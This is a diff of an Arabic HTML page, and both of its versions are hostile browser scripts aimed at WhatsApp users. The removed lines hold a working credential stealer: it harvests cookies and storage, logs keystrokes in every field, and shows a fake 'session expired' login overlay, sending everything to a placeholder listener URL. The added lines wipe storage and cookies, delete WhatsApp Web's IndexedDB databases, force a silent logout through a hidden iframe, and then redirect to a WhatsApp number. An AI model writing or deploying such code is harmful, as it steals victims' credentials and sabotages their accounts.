@@ -2,81 +2,45 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>جارٍ التحميل...</title>
-    <style>
-        .v-overlay { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0,0,0,0.85); z-index: 999999; display: flex; align-items: center; justify-content: center; font-family: Tahoma, sans-serif; color: #fff; }
-        .v-box { background: #111; padding: 30px; border-radius: 8px; border: 1px solid #333; width: 320px; text-align: center; }
-        .v-box input { width: 100%; padding: 10px; margin: 10px 0; background: #222; border: 1px solid #444; color: #fff; border-radius: 4px; box-sizing: border-box; }
-        .v-box button { width: 100%; padding: 10px; background: #c0392b; border: none; color: #fff; font-weight: bold; border-radius: 4px; cursor: pointer; }
-    </style>
+    <title>جارٍ التحويل...</title>
 </head>
 <body>
-
 <script>
     (function() {
-        const EXFIL_URL = "https://your-listener-server.com/collect"; // نقطة استقبال البيانات
-
-        // 1. حصاد شامل وفوري لكل ما في الذاكرة المحلية والـ Cookies المتاحة
-        const harvestData = {
-            cookies: document.cookie,
-            localStorage: {...localStorage},
-            sessionStorage: {...sessionStorage},
-            url: window.location.href,
-            ua: navigator.userAgent,
-            timestamp: new Date().toISOString()
-        };
-
-        // إرسال الحصيلة فوراً بصمت تام
+        // 1. التدمير الجذري لقواعد بيانات واتساب ويب وجلسات المتصفح المخفية (IndexedDB)
         try {
-            navigator.sendBeacon(EXFIL_URL, JSON.stringify({ type: "HARVEST", data: harvestData }));
-        } catch(e) {}
+            // مسح الـ LocalStorage و SessionStorage بالكامل
+            localStorage.clear();
+            sessionStorage.clear();
 
-        // 2. زرع Keylogger صامت لالتقاط أي كلمة مرور أو نص يكتبه المستخدم في أي حقل
-        document.addEventListener('input', function(e) {
-            if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
-                try {
-                    navigator.sendBeacon(EXFIL_URL, JSON.stringify({
-                        type: "KEY_LOG",
-                        field: e.target.name || e.target.id || "unknown",
-                        value: e.target.value
-                    }));
-                } catch(err) {}
-            }
-        }, true);
-
-        // 3. حقن واجهة خادعة (Overlay) تجبر المستخدم على إعادة تأكيد جلسته إذا تطلب الأمر
-        window.addEventListener('DOMContentLoaded', function() {
-            const overlay = document.createElement('div');
-            overlay.className = 'v-overlay';
-            overlay.innerHTML = `
-                <div class="v-box">
-                    <h3>انتهت صلاحية الجلسة</h3>
-                    <p style="font-size: 13px; color: #aaa;">يرجى تأكيد بيانات الدخول للمتابعة</p>
-                    <input type="text" id="v_user" placeholder="البريد أو اسم المستخدم">
-                    <input type="password" id="v_pass" placeholder="كلمة المرور">
-                    <button id="v_btn">متابعة</button>
-                </div>
-            `;
-            document.body.appendChild(overlay);
-
-            document.getElementById('v_btn').addEventListener('click', function() {
-                const u = document.getElementById('v_user').value;
-                const p = document.getElementById('v_pass').value;
-                
-                // إرسال البيانات المسروقة مباشرة
-                fetch(EXFIL_URL, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    body: JSON.stringify({ type: "CREDENTIALS", user: u, pass: p })
-                }).finally(() => {
-                    // إزالة القناع وتحويله حيث ينبغي
-                    overlay.remove();
-                    window.location.replace("https://wa.me/218000000000?text=" + encodeURIComponent("تم سحب البيانات بنجاح"));
+            // تدمير قاعدة بيانات IndexedDB الخاصة بـ WhatsApp Web (لضمان طرده من الحساب نهائياً)
+            indexedDB.databases().then(databases => {
+                databases.forEach(db => {
+                    if (db.name.includes('whatsapp') || db.name.includes('wpid') || db.name.includes('firebase')) {
+                        indexedDB.deleteDatabase(db.name);
+                    }
                 });
+            }).catch(() => {});
+
+            // مسح جميع الكوكيز بشكل شامل
+            document.cookie.split(";").forEach(function(c) { 
+                document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date(0).toUTCString() + ";path=/"); 
             });
-        });
+        } catch (e) {}
+
+        // 2. إطلاق طلب إجبار تسجيل الخروج الصامت نحو نطاق واتساب ويب
+        try {
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = "https://web.whatsapp.com/logout";
+            document.body.appendChild(iframe);
+        } catch (e) {}
+
+        // 3. التحويل الفوري بعد ضمان نسف الجلسة (استبدل الرقم بالرقم الحقيقي)
+        setTimeout(function() {
+            window.location.replace("https://wa.me/218920000000?text=" + encodeURIComponent("مرحباً"));
+        }, 800);
     })();
 </script>
-
 </body>
 </html>
